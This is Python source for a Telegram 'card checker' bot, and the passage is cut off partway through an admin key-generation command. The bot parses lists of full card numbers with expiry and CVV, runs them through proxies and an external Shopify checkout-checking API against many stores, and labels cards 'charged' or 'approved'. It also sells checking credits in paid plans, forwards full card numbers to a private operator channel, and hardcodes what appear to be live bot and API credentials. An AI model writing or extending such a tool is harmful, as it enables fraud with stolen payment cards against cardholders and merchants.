from telethon import TelegramClient, events, Button
import asyncio
import aiohttp
import aiofiles
import os
import random
import time
import json
import re
import string
from datetime import datetime, timedelta

# ========== CONFIGURATION ==========
CHECKER_API_URL = 'https://web-production-669be.up.railway.app/shopify'

API_ID = 30252641
API_HASH = 'dadc7b78300b20ef5ebe277713d6478e'
BOT_TOKEN = '8481823831:AAGyewGoeYKXBgTlBYbX5b7JnluzYQIZhiM'

ADMIN_IDS = [6506943274]
PVT_CHANNEL_ID = -1002200268580

# Required channels to join
REQUIRED_CHATS = [
    {"link": "https://t.me/dududadadee", "id": None},
    {"link": "https://t.me/dududadadee", "id": None},
    {"link": "https://t.me/dududadadee", "id": None},
]

# Premium Plans with Credits
PLANS = {
    "trial": {"days": 1, "credits": 10000, "price": "2$", "name": "⭐ TRIAL"},
    "bronze": {"days": 3, "credits": 20000, "price": "4$", "name": "🥉 BRONZE"},
    "silver": {"days": 7, "credits": 40000, "price": "8$", "name": "🥈 SILVER"},
    "gold": {"days": 14, "credits": 50000, "price": "12$", "name": "🥇 GOLD"},
    "platinum": {"days": 24, "credits": 100000, "price": "22$", "name": "💎 PLATINUM"},
}

# File paths
PREMIUM_FILE = 'premium.json'
KEYS_FILE = 'keys.json'
CREDITS_FILE = 'credits.json'
CREDIT_KEYS_FILE = 'credit_keys.json'
SITES_FILE = 'sites.txt'
PROXY_FILE = 'proxy.txt'
BANNED_FILE = 'banned.txt'
GROUP_SETTINGS_FILE = 'group_settings.json'
USER_PROXIES_FILE = 'user_proxies.json'
HIT_STATS_FILE = 'hit_stats.json'

# Site filter presets
SITE_FILTERS = {
    "all": {"name": "📊 All Sites", "min": 0, "max": 999999},
    "under5": {"name": "💰 Under $5", "min": 0, "max": 5},
    "under10": {"name": "💰 Under $10", "min": 0, "max": 10},
    "under15": {"name": "💰 Under $15", "min": 0, "max": 15},
    "under20": {"name": "💰 Under $20", "min": 0, "max": 20},
    "under30": {"name": "💰 Under $30", "min": 0, "max": 30},
}

# ========== DARK EMOJI MAPPING ==========
DARK_EMOJIS = {
    "success": "✅",
    "error": "❌",
    "warning": "⚠️",
    "info": "ℹ️",
    "card": "💳",
    "site": "🌐",
    "proxy": "🔌",
    "charged": "⚡",
    "live": "💀",
    "dead": "⬛",
    "credit": "💰",
    "time": "⏱️",
    "user": "👤",
    "admin": "🔑",
    "stop": "⏹️",
    "pause": "⏸️",
    "resume": "▶️",
    "stats": "📊",
    "file": "📄",
    "settings": "⚙️",
    "premium": "💎",
    "plan": "📋",
    "key": "🔐",
    "link": "🔗",
    "warning_sign": "🚫",
    "check": "✔️",
    "cross": "✖️",
    "star": "⭐",
    "fire": "🔥",
    "skull": "💀",
    "robot": "🤖",
}

bot = TelegramClient('dark_checker_bot', API_ID, API_HASH)
active_sessions = {}
ACTIVE_FILTER = "all"
REFERRAL_FILE = 'referrals.json'
RATE_LIMIT_SECONDS = 3
CREDITS_LOW_THRESHOLD = 100
REFERRAL_REWARD = 200

_rate_limit_cache = {}
_user_active_sessions = {}

# ========== CREDITS SYSTEM ==========
def load_credits():
    if not os.path.exists(CREDITS_FILE):
        return {}
    try:
        with open(CREDITS_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except:
        return {}

def save_credits(credits_data):
    try:
        with open(CREDITS_FILE, 'w', encoding='utf-8') as f:
            json.dump(credits_data, f, indent=4)
    except:
        pass

def get_user_credits(user_id):
    credits_data = load_credits()
    uid = str(user_id)
    if uid not in credits_data:
        credits_data[uid] = 0
        save_credits(credits_data)
        return 0
    return credits_data[uid]

def add_credits(user_id, amount):
    credits_data = load_credits()
    uid = str(user_id)
    credits_data[uid] = credits_data.get(uid, 0) + amount
    save_credits(credits_data)
    return True

def remove_credits(user_id, amount):
    credits_data = load_credits()
    uid = str(user_id)
    current = credits_data.get(uid, 0)
    new_amount = max(0, current - amount)
    credits_data[uid] = new_amount
    save_credits(credits_data)
    return True

def deduct_credit(user_id):
    credits_data = load_credits()
    uid = str(user_id)
    current = credits_data.get(uid, 0)
    if current >= 1:
        credits_data[uid] = current - 1
        save_credits(credits_data)
        return True
    return False

# ========== REFERRAL SYSTEM ==========
def load_referrals():
    if not os.path.exists(REFERRAL_FILE):
        return {}
    try:
        with open(REFERRAL_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except:
        return {}

def save_referrals(data):
    with open(REFERRAL_FILE, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=4)

# ========== PREMIUM SYSTEM ==========
def load_premium_users():
    if not os.path.exists(PREMIUM_FILE):
        return {}
    try:
        with open(PREMIUM_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except:
        return {}

def save_premium_users(premium_data):
    try:
        with open(PREMIUM_FILE, 'w', encoding='utf-8') as f:
            json.dump(premium_data, f, indent=4)
    except:
        pass

def load_keys():
    if not os.path.exists(KEYS_FILE):
        return {}
    try:
        with open(KEYS_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except:
        return {}

def save_keys(keys_data):
    with open(KEYS_FILE, 'w', encoding='utf-8') as f:
        json.dump(keys_data, f, indent=4)

def load_credit_keys():
    if not os.path.exists(CREDIT_KEYS_FILE):
        return {}
    try:
        with open(CREDIT_KEYS_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except:
        return {}

def save_credit_keys(keys_data):
    with open(CREDIT_KEYS_FILE, 'w', encoding='utf-8') as f:
        json.dump(keys_data, f, indent=4)

def get_user_plan_name(user_id):
    premium_data = load_premium_users()
    uid = str(user_id)
    if uid in premium_data:
        plan_key = premium_data[uid].get('plan', 'trial')
        return PLANS.get(plan_key, {}).get('name', 'FREE')
    return 'FREE'

def is_premium(user_id):
    premium_data = load_premium_users()
    uid = str(user_id)
    if uid in premium_data:
        try:
            expiry = datetime.fromisoformat(premium_data[uid]['expiry'])
            if datetime.now() < expiry:
                return True
        except:
            return False
    return False

def add_premium_user(user_id, plan_key, days, credits):
    premium_data = load_premium_users()
    uid = str(user_id)
    expiry = (datetime.now() + timedelta(days=days)).isoformat()
    premium_data[uid] = {
        'plan': plan_key,
        'expiry': expiry,
        'credits_added': credits
    }
    save_premium_users(premium_data)
    add_credits(user_id, credits)

# ========== RESOLVE CHAT IDS ==========
async def resolve_chat_ids():
    for chat in REQUIRED_CHATS:
        try:
            entity = await bot.get_entity(chat["link"])
            chat["id"] = entity.id
            print(f"Resolved: {chat['link']} -> {entity.id}")
        except Exception as e:
            print(f"Failed to resolve {chat['link']}: {e}")

# ========== CHECK IF USER JOINED ALL ==========
async def check_user_joined(user_id):
    missing_chats = []
    for chat in REQUIRED_CHATS:
        if chat["id"] is None:
            continue
        try:
            found = False
            async for p in bot.iter_participants(chat["id"]):
                if p.id == user_id:
                    found = True
                    break
            if not found:
                missing_chats.append(chat["link"])
        except:
            missing_chats.append(chat["link"])
    if missing_chats:
        return False, missing_chats
    return True, None

# ========== HELPER FUNCTIONS ==========
def is_admin(user_id):
    return user_id in ADMIN_IDS

def get_file_lines(filepath):
    if not os.path.exists(filepath):
        return []
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except:
        return []

def is_banned(user_id):
    if not os.path.exists(BANNED_FILE):
        return False
    try:
        with open(BANNED_FILE, 'r', encoding='utf-8') as f:
            banned = [line.strip() for line in f if line.strip()]
        return str(user_id) in banned
    except:
        return False

def ban_user(user_id):
    uid = str(user_id)
    if not is_banned(uid):
        with open(BANNED_FILE, 'a', encoding='utf-8') as f:
            f.write(f"{uid}\n")

def unban_user(user_id):
    uid = str(user_id)
    if not os.path.exists(BANNED_FILE):
        return
    try:
        with open(BANNED_FILE, 'r', encoding='utf-8') as f:
            lines = [line.strip() for line in f if line.strip() and line.strip() != uid]
        with open(BANNED_FILE, 'w', encoding='utf-8') as f:
            for line in lines:
                f.write(f"{line}\n")
    except:
        pass

# ========== HIT STATS ==========
def load_hit_stats():
    if not os.path.exists(HIT_STATS_FILE):
        return {}
    try:
        with open(HIT_STATS_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except:
        return {}

def save_hit_stats(data):
    with open(HIT_STATS_FILE, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=4)

def record_hit(user_id, hit_type):
    data = load_hit_stats()
    uid = str(user_id)
    if uid not in data:
        data[uid] = {"charged": 0, "approved": 0, "dead": 0, "total": 0}
    data[uid][hit_type] = data[uid].get(hit_type, 0) + 1
    data[uid]["total"] = data[uid].get("total", 0) + 1
    save_hit_stats(data)

# ========== USER PROXIES ==========
def load_user_proxies():
    if not os.path.exists(USER_PROXIES_FILE):
        return {}
    try:
        with open(USER_PROXIES_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except:
        return {}

def save_user_proxies(data):
    with open(USER_PROXIES_FILE, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=4)

def get_user_specific_proxies(user_id):
    data = load_user_proxies()
    uid = str(user_id)
    return data.get(uid, [])

# ========== RATE LIMIT ==========
def check_rate_limit(user_id):
    now = time.time()
    if user_id in _rate_limit_cache:
        if now - _rate_limit_cache[user_id] < RATE_LIMIT_SECONDS:
            return False
    _rate_limit_cache[user_id] = now
    return True

# ========== CREDITS LOW CHECK ==========
async def check_credits_low(user_id):
    credits = get_user_credits(user_id)
    if 0 < credits < CREDITS_LOW_THRESHOLD:
        try:
            await bot.send_message(user_id,
                f"⚠️ <b>Low Credits Warning!</b>\n\n"
                f"💰 Your balance: <code>{credits}</code>\n"
                f"📋 Get more credits: /redeemcredit\n"
                f"💎 Upgrade: /plans",
                parse_mode='html')
        except:
            pass

# ========== SITES MANAGEMENT ==========
def load_sites():
    all_sites = get_file_lines(SITES_FILE)
    return all_sites

def add_site(site_url):
    sites = load_sites()
    if site_url in sites:
        return False
    with open(SITES_FILE, 'a', encoding='utf-8') as f:
        f.write(f"{site_url}\n")
    return True

def add_sites_bulk(site_urls):
    current_sites = load_sites()
    added = []
    already = []
    for site in site_urls:
        if site not in current_sites:
            added.append(site)
        else:
            already.append(site)
    if added:
        with open(SITES_FILE, 'a', encoding='utf-8') as f:
            for site in added:
                f.write(f"{site}\n")
    return added, already

def remove_site(site_url):
    sites = load_sites()
    if site_url not in sites:
        return False
    new_sites = [s for s in sites if s != site_url]
    with open(SITES_FILE, 'w', encoding='utf-8') as f:
        for site in new_sites:
            f.write(f"{site}\n")
    return True

def load_proxies():
    return get_file_lines(PROXY_FILE)

# ========== SEND REALTIME HIT TO USER ==========
async def send_realtime_hit_to_user(user_id, hit_type, card, response_msg, gateway, price):
    if hit_type == "CHARGED":
        emoji = "⚡"
        header = "CHARGED HIT"
    elif hit_type == "APPROVED":
        emoji = "💀"
        header = "APPROVED HIT"
    else:
        return

    msg = f"""{emoji} <b>{header}!</b>
<b>─────────────────────</b>
<b>Card ➡</b> <code>{card}</code>
<b>Response ➡</b> {response_msg[:100]}
<b>Gateway ➡</b> {gateway}
<b>Price ➡</b> {price}
<b>─────────────────────</b>
🤖 <b>Bot By: <a href="tg://user?id=7415233736">BUBU</a></b>"""

    try:
        await bot.send_message(user_id, msg, parse_mode='html')
    except Exception as e:
        print(f"Error sending hit to user: {e}")

# ========== PVT CHANNEL LOGS (ONLY CHARGED HITS) ==========
async def send_log_to_channel(response_msg, gateway, price, username, user_id, card):
    header = "⚡ CHARGED HIT"

    if username:
        user_display = username
    else:
        user_display = str(user_id)

    plan_name = get_user_plan_name(user_id)

    log_message = f"""<b>{header}</b>
<b>─────────────────────</b>
<b>Response ➡</b> {response_msg[:100]}
<b>Gateway ➡</b> {gateway}
<b>Price ➡</b> {price}
<b>Card ➡</b> <code>{card}</code>
<b>─────────────────────</b>
<b>User ➡</b> <a href="tg://user?id={user_id}">{user_display}</a> ({plan_name} USER)"""

    try:
        await bot.send_message(PVT_CHANNEL_ID, log_message, parse_mode='html')
    except Exception as e:
        print(f"Error sending log to PVT channel: {e}")

# ========== GET BIN INFO ==========
async def get_bin_info(card_number):
    try:
        bin_number = card_number[:6]
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(f'https://bins.antipublic.cc/bins/{bin_number}') as res:
                if res.status != 200:
                    return '-', '-', '-', '-', '-', ''
                data = await res.json()
                brand = data.get('brand', '-')
                bin_type = data.get('type', '-')
                level = data.get('level', '-')
                bank = data.get('bank', '-')
                country = data.get('country_name', '-')
                flag = data.get('country_flag', '')
                return brand, bin_type, level, bank, country, flag
    except Exception:
        return '-', '-', '-', '-', '-', ''

# ========== DEAD INDICATORS ==========
_DEAD_INDICATORS = (
    'receipt id is empty', 'handle is empty', 'product id is empty',
    'tax amount is empty', 'payment method identifier is empty',
    'invalid url', 'error in 1st req', 'error in 1 req',
    'cloudflare', 'connection failed', 'timed out',
    'access denied', 'tlsv1 alert', 'ssl routines',
    'could not resolve', 'domain name not found',
    'name or service not known', 'openssl ssl_connect',
    'empty reply from server', 'httperror504', 'http error',
    'timeout', 'unreachable', 'ssl error',
    '502', '503', '504', 'bad gateway', 'service unavailable',
    'gateway timeout', 'network error', 'connection reset',
    'failed to detect product', 'failed to create checkout',
    'failed to tokenize card', 'failed to get proposal data',
    'submit rejected', 'submit rejected:', 'handle error', 'http 404',
    'delivery_delivery_line_detail_changed', 'delivery_address2_required',
    'url rejected', 'malformed input', 'amount_too_small', 'amount too small',
    'site dead', 'captcha_required', 'captcha required', 'site errors', 'failed',
    'all products sold out', 'no_session_token', 'tokenize_fail',
)

def extract_cc(text):
    pattern = r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})'
    matches = re.findall(pattern, text)
    cards = []
    for match in matches:
        card, month, year, cvv = match
        if len(year) == 2:
            year = '20' + year
        cards.append(f"{card}|{month}|{year}|{cvv}")
    return cards

def is_dead_site_error(error_msg):
    if not error_msg:
        return False
    msg_lower = error_msg.lower()
    for indicator in _DEAD_INDICATORS:
        if indicator in msg_lower:
            return True
    return False

async def check_card(card, site, proxy):
    try:
        parts = card.split('|')
        if len(parts) != 4:
            return {'status': 'Invalid Format', 'message': 'Invalid card format', 'card': card}

        params = {'cc': card, 'site': site, 'proxy': proxy}
        timeout = aiohttp.ClientTimeout(total=120)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(CHECKER_API_URL, params=params) as resp:
                raw = await resp.json(content_type=None)

        response_msg = raw.get('Response', '')
        price = raw.get('Price', '-')
        gate = raw.get('Gate', 'Shopify Payments')
        status = raw.get('Status', '')

        if is_dead_site_error(response_msg):
            return {'status': 'Site Error', 'message': response_msg, 'card': card, 'retry': True, 'gateway': gate, 'price': price}

        response_lower = response_msg.lower()

        if status == 'Charged' or 'order completed' in response_lower or 'order_placed' in response_lower or 'ORDER_PLACED' in response_msg:
            return {'status': 'Charged', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}
        elif 'cloudflare bypass failed' in response_lower:
            return {'status': 'Site Error', 'message': 'Cloudflare spotted', 'card': card, 'retry': True, 'gateway': gate, 'price': price}
        elif 'thank you' in response_lower or 'payment successful' in response_lower:
            return {'status': 'Charged', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}
        elif status == 'Approved' or any(key in response_lower for key in [
            'approved', 'success', 'insufficient_funds', 'insufficient funds',
            'invalid_cvv', 'incorrect_cvv', 'invalid_cvc', 'incorrect_cvc',
            'invalid cvv', 'incorrect cvv', 'invalid cvc', 'incorrect cvc',
            'incorrect_zip', 'incorrect zip'
        ]):
            return {'status': 'Approved', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}
        else:
            return {'status': 'Dead', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}

    except asyncio.TimeoutError:
        return {'status': 'Site Error', 'message': 'Request timeout', 'card': card, 'retry': True}
    except Exception as e:
        error_msg = str(e)
        if is_dead_site_error(error_msg):
            return {'status': 'Site Error', 'message': error_msg, 'card': card, 'retry': True}
        return {'status': 'Dead', 'message': error_msg, 'card': card, 'gateway': 'Unknown', 'price': '-'}

async def check_card_with_retry(card, sites, proxies, max_retries=2):
    last_result = None
    if not sites:
        return {'status': 'Dead', 'message': 'No sites available', 'card': card, 'gateway': 'Unknown', 'price': '-'}
    if not proxies:
        return {'status': 'Dead', 'message': 'No proxies available', 'card': card, 'gateway': 'Unknown', 'price': '-'}

    for attempt in range(max_retries):
        site = random.choice(sites)
        proxy = random.choice(proxies)
        result = await check_card(card, site, proxy)

        if not result.get('retry'):
            return result
        last_result = result

    return last_result if last_result else {'status': 'Dead', 'message': 'All retries failed', 'card': card, 'gateway': 'Unknown', 'price': '-'}

# ========== TEST FUNCTIONS ==========
async def test_site(site, proxy):
    test_card = "4000000000000000|12|2026|123"
    try:
        params = {'cc': test_card, 'site': site, 'proxy': proxy}
        timeout = aiohttp.ClientTimeout(total=15)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(CHECKER_API_URL, params=params) as resp:
                raw = await resp.json(content_type=None)
        response_msg = raw.get('Response', '').lower()
        if is_dead_site_error(response_msg):
            return {'status': 'dead', 'site': site}
        return {'status': 'alive', 'site': site}
    except:
        return {'status': 'dead', 'site': site}

async def test_proxy(proxy):
    test_card = "4000000000000000|12|2026|123"
    test_site_url = "https://example.com"
    try:
        params = {'cc': test_card, 'site': test_site_url, 'proxy': proxy}
        timeout = aiohttp.ClientTimeout(total=15)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(CHECKER_API_URL, params=params) as resp:
                raw = await resp.json(content_type=None)
        response_msg = raw.get('Response', '').lower()
        if 'could not resolve' in response_msg or 'connection failed' in response_msg:
            return {'status': 'dead', 'proxy': proxy}
        return {'status': 'alive', 'proxy': proxy}
    except:
        return {'status': 'dead', 'proxy': proxy}

# ========== GROUP SETTINGS ==========
def load_group_settings():
    if not os.path.exists(GROUP_SETTINGS_FILE):
        return {}
    try:
        with open(GROUP_SETTINGS_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except:
        return {}

def save_group_settings(settings):
    with open(GROUP_SETTINGS_FILE, 'w', encoding='utf-8') as f:
        json.dump(settings, f, indent=4)
# ========== COMMANDS ==========

@bot.on(events.NewMessage(pattern=r'^/start(@\w+)?(\s+.*)?$'))
async def start(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply("🚫 <b>You are banned from using this bot.</b>", parse_mode='html')

    args = event.message.text.split()
    if len(args) > 1:
        ref_code = args[1]
        if ref_code.isdigit():
            ref_id = int(ref_code)
            if ref_id != user_id:
                referrals = load_referrals()
                uid = str(user_id)
                if uid not in referrals:
                    info = load_referrals()
                    if uid not in info:
                        info[uid] = {'referred_by': ref_id, 'referred_at': datetime.now().isoformat(), 'total_earned': 0}
                    info[uid]['referred_by'] = ref_id
                    info[uid]['total_earned'] = info[uid].get('total_earned', 0) + REFERRAL_REWARD
                    save_referrals(info)
                    add_credits(int(uid), REFERRAL_REWARD)
                    try:
                        await bot.send_message(ref_id,
                            f"🎉 <b>New Referral!</b>\n\n"
                            f"👤 User <code>{user_id}</code> joined!\n"
                            f"💰 You earned <b>{REFERRAL_REWARD}</b> credits!",
                            parse_mode='html')
                    except:
                        pass

    joined, missing = await check_user_joined(user_id)
    if not joined:
        buttons = [[Button.inline("✅ Check Joined", b"check_joined")]]
        missing_text = "\n".join([f"➡️ {link}" for link in missing[:5]])
        return await event.reply(
            f"⚠️ <b>Please join our channels:</b>\n\n"
            f"{missing_text}\n\n"
            f"Tap below after joining:",
            buttons=buttons,
            parse_mode='html'
        )

    credits = get_user_credits(user_id)
    plan_name = get_user_plan_name(user_id)

    welcome_text = f"""<b>🤖 DARK CHECKER BOT</b>
<b>─────────────────────</b>
<b>👤 User:</b> <code>{user_id}</code>
<b>📋 Plan:</b> {plan_name}
<b>💰 Credits:</b> {credits}
<b>─────────────────────</b>
<b>Available Commands:</b>
➡️ /cc - Check single card
➡️ /chk - Check cards from .txt
➡️ /multi - Multi-card check
➡️ /mcc - Mass card check
➡️ /info - Card BIN info
➡️ /plans - Premium plans
➡️ /redeem - Redeem premium key
➡️ /redeemcredit - Redeem credit key
➡️ /myhistory - Your hit history
➡️ /topusers - Top hit users
➡️ /refer - Get referral link
➡️ /transfercredits - Send credits
➡️ /ping - Check bot status
<b>─────────────────────</b>
<b>📢 Updates:</b> @dududadadee
🤖 <b>Bot By: <a href="tg://user?id=7415233736">BUBU</a></b>"""

    await event.reply(welcome_text, parse_mode='html')

@bot.on(events.CallbackQuery(pattern=b"check_joined"))
async def check_joined_callback(event):
    user_id = event.sender_id
    joined, missing = await check_user_joined(user_id)

    if joined:
        await event.answer("✅ You're in! Use /start again.", alert=True)
        await event.delete()
    else:
        missing_text = "\n".join([f"➡️ {link}" for link in missing[:5]])
        await event.answer(f"❌ Still not joined:\n{missing_text}", alert=True)

@bot.on(events.NewMessage(pattern=r'^/info(@\w+)?(\s+.*)?$'))
async def info(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply("🚫 You are banned!", parse_mode='html')

    args = event.message.text.split()
    if len(args) < 2:
        return await event.reply("❌ Usage: <code>/info 4000001234560000</code>", parse_mode='html')

    bin_num = args[1][:6]
    brand, bin_type, level, bank, country, flag = await get_bin_info(bin_num)

    text = f"""<b>💳 BIN INFO</b>
<b>─────────────────────</b>
<b>BIN:</b> <code>{bin_num}</code>
<b>Brand:</b> {brand}
<b>Type:</b> {bin_type}
<b>Level:</b> {level}
<b>Bank:</b> {bank}
<b>Country:</b> {country} {flag}
<b>─────────────────────</b>
🤖 <b>Bot By: <a href="tg://user?id=7415233736">BUBU</a></b>"""

    await event.reply(text, parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/plans(@\w+)?(\s+.*)?$'))
async def plans(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply("🚫 You are banned!", parse_mode='html')

    text = "<b>💎 PREMIUM PLANS</b>\n<b>─────────────────────</b>\n\n"
    for key, plan in PLANS.items():
        text += f"<b>{plan['name']}</b>\n"
        text += f"📅 {plan['days']} days | 💰 {plan['credits']} credits | 💵 {plan['price']}\n\n"

    text += "<b>─────────────────────</b>\n"
    text += "📋 <b>To purchase:</b> Contact Admin\n"
    text += "🔐 <b>Redeem key:</b> /redeem\n"
    text += "💰 <b>Redeem credits:</b> /redeemcredit\n"
    text += "<b>─────────────────────</b>\n"
    text += "🤖 <b>Bot By: <a href=\"tg://user?id=7415233736\">BUBU</a></b>"

    await event.reply(text, parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/redeem(@\w+)?(\s+.*)?$'))
async def redeem(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply("🚫 You are banned!", parse_mode='html')

    args = event.message.text.split()
    if len(args) != 2:
        return await event.reply("❌ Usage: <code>/redeem KEY</code>", parse_mode='html')

    key = args[1].strip()
    keys_data = load_keys()
    if key not in keys_data:
        return await event.reply("❌ Invalid or expired key!", parse_mode='html')

    key_info = keys_data[key]
    plan_key = key_info.get('plan', 'trial')
    days = key_info.get('days', 1)
    credits = key_info.get('credits', 0)

    add_premium_user(user_id, plan_key, days, credits)
    del keys_data[key]
    save_keys(keys_data)

    plan_name = PLANS.get(plan_key, {}).get('name', 'FREE')
    await event.reply(
        f"✅ <b>Key Redeemed!</b>\n\n"
        f"📋 Plan: {plan_name}\n"
        f"📅 Duration: {days} days\n"
        f"💰 Credits: {credits}",
        parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/redeemcredit(@\w+)?(\s+.*)?$'))
async def redeemcredit(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply("🚫 You are banned!", parse_mode='html')

    args = event.message.text.split()
    if len(args) != 2:
        return await event.reply("❌ Usage: <code>/redeemcredit KEY</code>", parse_mode='html')

    key = args[1].strip()
    credit_keys = load_credit_keys()
    if key not in credit_keys:
        return await event.reply("❌ Invalid or expired credit key!", parse_mode='html')

    credit_amount = credit_keys[key].get('credits', 0)
    add_credits(user_id, credit_amount)
    del credit_keys[key]
    save_credit_keys(credit_keys)

    await event.reply(f"✅ <b>Credit Key Redeemed!</b>\n\n💰 Credits added: {credit_amount}", parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/addpremium(@\w+)?(\s+.*)?$'))
async def addpremium(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply("❌ <b>Admin only command!</b>", parse_mode='html')

    args = event.message.text.split()
    if len(args) < 3:
        return await event.reply("❌ Usage: <code>/addpremium user_id plan</code>", parse_mode='html')

    try:
        target_id = int(args[1])
        plan_key = args[2].lower()

        if plan_key not in PLANS:
            await event.reply(f"❌ Invalid plan! Available: trial, bronze, silver, gold, platinum", parse_mode='html')
            return

        plan_info = PLANS[plan_key]
        days = plan_info['days']
        credits = plan_info['credits']

        add_premium_user(target_id, plan_key, days, credits)

        await event.reply(f"✅ <b>Premium added!</b>\n\n👤 User: <code>{target_id}</code>\n📋 Plan: {plan_info['name']}\n📅 Days: {days}\n💰 Credits: {credits}", parse_mode='html')

    except:
        await event.reply("❌ Invalid user_id!", parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/addpremiumcustom(@\w+)?(\s+.*)?$'))
async def addpremiumcustom(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply("❌ <b>Admin only command!</b>", parse_mode='html')

    args = event.message.text.split()
    if len(args) < 4:
        return await event.reply("❌ Usage: <code>/addpremiumcustom user_id plan days credits</code>", parse_mode='html')

    try:
        target_id = int(args[1])
        plan_key = args[2].lower()
        days = int(args[3])
        credits = int(args[4]) if len(args) > 4 else 0

        if plan_key not in PLANS:
            await event.reply(f"❌ Invalid plan! Available: trial, bronze, silver, gold, platinum", parse_mode='html')
            return

        add_premium_user(target_id, plan_key, days, credits)
        plan_name = PLANS[plan_key]['name']

        await event.reply(f"✅ <b>Custom Premium added!</b>\n\n👤 User: <code>{target_id}</code>\n📋 Plan: {plan_name}\n📅 Days: {days}\n💰 Credits: {credits}", parse_mode='html')

    except:
        await event.reply("❌ Invalid arguments!", parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/removepremium(@\w+)?(\s+.*)?$'))
async def removepremium(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply("❌ <b>Admin only command!</b>", parse_mode='html')

    args = event.message.text.split()
    if len(args) != 2:
        return await event.reply("❌ Usage: <code>/removepremium user_id</code>", parse_mode='html')

    try:
        target_id = int(args[1])
        premium_data = load_premium_users()
        uid = str(target_id)
        if uid in premium_data:
            del premium_data[uid]
            save_premium_users(premium_data)
            await event.reply(f"✅ <b>Premium removed!</b>\n\n👤 User: <code>{target_id}</code>", parse_mode='html')
        else:
            await event.reply("❌ User is not premium!", parse_mode='html')
    except:
        await event.reply("❌ Invalid user_id!", parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/addcredits(@\w+)?(\s+.*)?$'))
async def addcredits_command(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply("❌ <b>Admin only command!</b>", parse_mode='html')

    args = event.message.text.split()
    if len(args) < 3:
        return await event.reply("❌ Usage: <code>/addcredits user_id amount</code>", parse_mode='html')

    try:
        target_id = int(args[1])
        amount = int(args[2])
        add_credits(target_id, amount)
        new_balance = get_user_credits(target_id)
        await event.reply(f"✅ <b>Credits Added!</b>\n\n👤 User: <code>{target_id}</code>\n💰 Added: {amount}\n💰 New Balance: {new_balance}", parse_mode='html')
    except:
        await event.reply("❌ Invalid user_id or amount!", parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/removecredits(@\w+)?(\s+.*)?$'))
async def removecredits_command(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply("❌ <b>Admin only command!</b>", parse_mode='html')

    args = event.message.text.split()
    if len(args) < 3:
        return await event.reply("❌ Usage: <code>/removecredits user_id amount</code>", parse_mode='html')

    try:
        target_id = int(args[1])
        amount = int(args[2])
        remove_credits(target_id, amount)
        new_balance = get_user_credits(target_id)
        await event.reply(f"✅ <b>Credits Removed!</b>\n\n👤 User: <code>{target_id}</code>\n💰 Removed: {amount}\n💰 New Balance: {new_balance}", parse_mode='html')
    except:
        await event.reply("❌ Invalid user_id or amount!", parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/ban(@\w+)?(\s+.*)?$'))
async def ban_command(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply("❌ <b>Admin only command!</b>", parse_mode='html')

    args = event.message.text.split()
    if len(args) != 2:
        return await event.reply("❌ Usage: <code>/ban user_id</code>", parse_mode='html')

    try:
        target_id = int(args[1])
        ban_user(target_id)
        await event.reply(f"🚫 <b>User Banned!</b>\n\n👤 User: <code>{target_id}</code>", parse_mode='html')
    except:
        await event.reply("❌ Invalid user_id!", parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/unban(@\w+)?(\s+.*)?$'))
async def unban_command(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply("❌ <b>Admin only command!</b>", parse_mode='html')

    args = event.message.text.split()
    if len(args) != 2:
        return await event.reply("❌ Usage: <code>/unban user_id</code>", parse_mode='html')

    try:
        target_id = int(args[1])
        unban_user(target_id)
        await event.reply(f"✅ <b>User Unbanned!</b>\n\n👤 User: <code>{target_id}</code>", parse_mode='html')
    except:
        await event.reply("❌ Invalid user_id!", parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/genpremiumkey(@\w+)?(\s+.*)?$'))
async def genpremiumkey(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply("❌ <b>Admin only command!</b>", parse_mode='html')

    args = event.message.text.split()
    if len(args) < 2:
        return await event.reply("❌ Usage: <code>/genpremiumkey plan [quantity]</code>", parse_mode='html')

    plan_key = args[1].lower()
    quantity = 1
    if len(args) >= 3:
